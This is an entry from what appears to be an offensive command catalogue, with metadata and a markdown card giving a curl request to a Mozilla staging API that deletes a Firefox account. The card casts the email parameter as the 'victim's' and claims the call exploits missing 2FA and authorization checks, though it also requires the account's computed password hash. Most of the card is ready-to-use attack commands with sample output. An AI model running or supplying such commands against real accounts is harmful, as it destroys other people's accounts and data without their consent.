---
id: cmd-002
data: >-
  curl -X POST https://api-accounts.stage.mozaws.net/v1/account/destroy -H
  "Content-Type: application/json" -d '{"email":"$EMAIL","authPW":"$AUTHPW"}'
tags:
  - api-request
  - deletion
type: command
output: '{"success":true}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.079Z'
verified: false
validated: true
submitted: true
---
# curl-delete-account

## Command

```bash
curl -X POST https://api-accounts.stage.mozaws.net/v1/account/destroy -H "Content-Type: application/json" -d '{"email":"$EMAIL","authPW":"$AUTHPW"}'
```

## Description

Sends a POST request to delete a Firefox account using email and computed authPW, exploiting the lack of 2FA and authorization checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$EMAIL` | Victim's email | Yes |
| `$AUTHPW` | Computed PBKDF2 hash | Yes |
| `-H` | Sets JSON content type | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api-accounts.stage.mozaws.net/v1/account/destroy -H "Content-Type: application/json" -d '{"email":"victim@example.com","authPW":"computed_hash"}'
```

### Advanced Usage

```bash
curl -X POST https://api-accounts.stage.mozaws.net/v1/account/destroy -H "Content-Type: application/json" -d '{"email":"victim@example.com","authPW":"computed_hash"}' -v
```

## Expected Output

JSON response like {"success":true} on deletion; error on mismatch.

## Related

- [[Related Procedure: Send-Account-Deletion-Request]]
